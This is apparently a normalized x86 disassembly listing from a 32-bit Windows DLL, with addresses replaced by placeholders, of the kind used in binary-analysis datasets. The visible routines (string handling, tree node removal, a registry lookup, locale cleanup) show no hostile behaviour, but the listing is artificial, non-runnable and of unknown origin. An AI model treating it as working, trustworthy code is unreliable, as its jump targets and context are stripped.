lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0xa78 ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0xc
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0xb
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0xd
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xa84 ]
push 0x1
push edx
lea ecx [ ebp - 0x664 ]
lea eax [ ebp - 0x86c ]
mov edx 0x80000002
call sub_1005f180
add esp 0x8
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0xe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0xf
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100609b0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10025a12
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_100609f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b59
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x10 ] 0x1
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov edi [ esi + 0x10 ]
sar eax 0x1
add eax edx
cmp edi eax
ja r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_1006da10
mov edi [ ebp + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10052290
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10068c70
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor edx edx
mov [ eax + edi * 2 ] dx
sub_10060ae0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
call sub_10005aa0
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_100651be
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0xc ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x8 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
push edi
call sub_10071d90
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call sub_1000a86e
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edi [ edx + 0x4 ]
je r-xdata
push edi
call sub_10064050
mov ecx [ ebp - 0xc ]
add esp 0x4
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_10071db0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_100583d0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x14 ] bl
call sub_10071db0
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_100583d0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x14 ] bl
call sub_100583d0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_10071db0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub_10060d50
push ebp
mov ebp esp
push 0xffffffff
push sub_100886f1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
lea edi [ ecx + 0x10 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0x24
add edi 0x24
jmp r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp esi eax
je r-xdata
lea eax [ edi - 0x10 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edx [ edi + 0xc ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x20 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] ebx
xor edx edx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
cmp [ edi + 0x4 ] 0x8
lea ebx [ edi - 0x10 ]
jae r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] edx
mov eax [ edi ]
inc eax
add eax eax
push eax
push ebx
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov edx [ edi ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x4 ] 0x7
mov [ edi ] 0x0
mov [ ebx ] cx
sub_10060e40
push esi
mov esi [ eax ]
push edi
mov edi ecx
test esi esi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
pop edi
lea eax [ esi + 0x1 ]
pop esi
retn
mov ebx [ esi ]
mov edx edi
call sub_10002e30
mov edi [ edi ]
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
retn
mov ebx edi
mov edi [ esi ]
call sub_1004ed00
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call ebx
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ esi + 0x2 ]
pop esi
retn
sub_10060ea0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
push esi
mov esi [ ecx + 0x3a0 ]
mov ecx [ ecx + 0x3a4 ]
xor eax eax
push edi
cmp esi ecx
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi ]
cmp edx [ edi ]
je r-xdata
mov eax edi
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
test [ eax + edx + 0x3c ] 0x6
jne r-xdata
add esi 0x4
cmp esi ecx
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x18 ]
push edx
call eax
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
sub eax edi
mov [ esp + 0x14 ] ecx
add eax ecx
mov eax [ eax + esi + 0x68 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx eax
call edx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
sub eax edi
add eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push 0x0
lea edi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push eax
add ecx 0x30
push ecx
call sub_10040f50
mov esi [ esi ]
mov edx [ esi + 0x30 ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0x3c ] 0x6
jne r-xdata
sub_10060f92
push 0xe8
mov eax sub_1008605e
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x90 ] al
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xb4 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10047742
pop ecx
mov esi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xb4 ]
lea eax [ ebp - 0xac ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1005b959
mov esi eax
pop ecx
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xac ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub ebx [ ebp + 0x34 ]
push 0x30
inc ebx
push ebx
push 0x0
lea ecx [ ebp + 0x24 ]
call sub_100502f0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002be90
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10026407
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
mov ebx eax
xor ebx edx
sub ebx edx
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x34 ] ebx
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0xf
pop esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x20 ] 0x0
mov edi [ ebp - 0x88 ]
mov eax [ edi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx edi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_1002f75b
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_1001fc54
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_100332a0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1003acf0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10005b50
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003acf0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10005b50
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
mov [ ebp - 0x84 ] al
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi ebx
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x98 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
jg r-xdata
mov esi [ ebp - 0x8c ]
cmp [ ebp + 0x34 ] esi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x94 ] 0x0
mov esi [ ebp - 0x88 ]
xor ebx ebx
inc ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax esi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x84 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_100502f0
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x90 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_100637b6
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10037f12
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor edi edi
test bl bl
jne r-xdata
sub eax edx
mov edi eax
jmp r-xdata
xor edi edi
cmp edi esi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc [ ebp - 0x94 ]
cmp [ ebp - 0x94 ] 0x4
jb r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10037f12
add esp 0x14
xor edi edi
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0xa8 ] eax
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x94 ]
movsx eax [ ebp + eax - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x98 ]
push edi
push [ ebp - 0x90 ]
xor esi esi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] esi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] esi
push [ ebp - 0xa4 ]
call sub_10037f12
add esp 0x14
push esi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_10005b50
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005b50
push esi
push ebx
lea ecx [ ebp + 0x24 ]
call sub_10005b50
mov eax [ ebp - 0xa4 ]
call sub_100262c3
retn 0x38
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x8c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
inc eax
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0xc ]
push eax
call sub_10070446
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0xa8 ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_100637b6
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0x88 ] al
push [ ebp - 0x88 ]
lea ecx [ ebp + 0xc ]
call sub_100637b6
mov eax [ ebp - 0x8c ]
sub eax [ ebp + 0x34 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_10037f12
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x10
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xf4 ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx [ ebp - 0x8c ]
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0xc ]
push eax
call sub_10070446
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ esi ]
add esp 0x14
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
lea ecx [ ebp + 0xc ]
call sub_100637b6
cmp [ ebp + 0x38 ] 0x10
mov ecx [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x34 ]
sub eax [ ebp - 0x8c ]
push [ ebp - 0x8c ]
add eax ecx
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
push eax
call sub_10070446
add esp 0x14
jmp r-xdata
sub_10061520
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007ec40
add esp 0xc
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_10061580
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
push edi
mov edi edx
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
mov edx esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_1004a3f0
add esp 0xc
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x10
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov edx esi
mov ecx edi
call sub_1002d770
add esp 0x8
mov eax 0x1
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
or [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] ecx
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
push ebx
push edi
mov ecx esi
call sub_10039c20
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
push ebx
mov ecx esi
mov edx edi
call sub_10032ea0
add esp 0x8
test eax eax
jne r-xdata
push ebx
mov edx esi
mov ecx edi
call sub_1003de90
add esp 0x4
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x20
mov eax [ ebp + 0x8 ]
push eax
push ebx
mov ecx esi
mov edx edi
call sub_1003eaa0
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
jne r-xdata
or [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
or eax 0x2
sub_10061657
push 0x8
push r--data
call sub_1007fad0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1007fb15
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1001b2d2
pop ecx
push 0xd
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10061771
push 0xc
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1006177d
push esi
call sub_1001b2d2
pop ecx
push edi
call sub_10038bf1
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1001b2d2
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000a2a1
pop ecx
sub_10061790
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x8 ]
mov esi [ edi + 0xc ]
cmp esi [ r--data ]
je r-xdata
mov eax [ edi + 0x1c ]
xor edx edx
push ebx
cmp eax edx
je r-xdata
mov eax [ ebp + 0xc ]
push ecx
mov [ edi + 0x4 ] 0x1
call sub_10079570
mov [ edi + 0x4 ] 0x0
mov eax [ r--data ]
add esp 0x4
mov [ edi + 0xc ] eax
pop edi
mov eax 0x1
pop esi
pop ebp
retn
lea ebx [ edi + 0x94 ]
push ebx
mov [ edi + 0x1c ] edx
call sub_100298f0
mov ecx [ edi ]
push ecx
mov esi eax
push esi
push r--data
call sub_100386a0
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx * 4 + rw-data ]
push eax
push esi
push edi
push ecx
call edx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
je r-xdata
mov esi [ edi + 0x14 ]
add esi [ edi + 0x10 ]
cmp eax esi
jae r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
movsx esi [ eax ]
mov eax [ ebp + 0xc ]
push ecx
call sub_10079570
add esp 0x4
mov [ edi + 0x4 ] ebx
mov eax 0x1
add [ edi + 0x1c ] eax
pop ebx
pop edi
pop esi
pop ebp
retn
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
test ecx ecx
je r-xdata
push ebx
call sub_100298f0
mov esi eax
